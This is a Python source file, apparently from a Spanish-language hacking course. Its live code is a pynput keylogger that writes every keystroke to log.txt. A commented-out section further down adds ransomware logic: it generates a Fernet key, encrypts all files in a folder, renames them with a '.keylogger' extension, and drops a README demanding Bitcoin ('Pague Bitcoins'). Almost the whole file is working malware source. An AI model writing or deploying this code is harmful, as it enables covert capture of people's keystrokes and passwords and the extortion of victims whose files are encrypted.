import os
from pynput.keyboard import Key, Listener
def on_press(key):
    try:
        with  open ('log.txt','a')as f:
            f.write(str(key) + '\n')
    except Exception as e:
        print(str(e))

def on_release(key):
    if key == Key.esc:
        f=open('log.txt','r+')
        buffer = f.read()
        f.close()
        
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()






























# import os
# from pynput.keyboard import Key, Listener
# from cryptography.fernet import Fernet

# # Ruta donde se guardarán los registros del keylogger
# log_file_path = 'C:/Users/JuanPablo/Documents/HE/Keylogger'

# def on_press(key):
#     try:
#         with open(log_file_path, 'a') as f:
#             f.write(str(key) + '\n')
#     except Exception as e:
#         print(str(e))

# def on_release(key):
#     if key == Key.esc:
#         return False

# # Iniciar el keylogger
# with Listener(on_press=on_press, on_release=on_release) as listener:
#     listener.join()

# # CIFRADO
# def generar_key():
#     key = Fernet.generate_key()
#     with open('key.key', 'wb') as key_file:
#         key_file.write(key)

# def cargar_key():
#     return open('key.key', 'rb').read()

# def cifrar(items, key):
#     f = Fernet(key)
#     for item in items:
#         # Leer el archivo
#         with open(item, 'rb') as file:
#             file_data = file.read()

#         encrypted_data = f.encrypt(file_data)

#         # Escribir archivo cifrado
#         with open(item, 'wb') as file:
#             file.write(encrypted_data)

#         os.rename(item, item + '.keylogger')

# if __name__ == '__main__':
#     path_to_encrypt = 'C:/Users/juana/OneDrive/Escritorio/IUEHE2/202302/Keylogger/log.txt'
#     items = os.listdir(path_to_encrypt)
#     full_path = [os.path.join(path_to_encrypt, item) for item in items]

#     generar_key()
#     key = cargar_key()
#     cifrar(full_path, key)

#     with open(os.path.join(path_to_encrypt, 'README.txt'), 'w') as file:
#         file.write('Pague Bitcoins')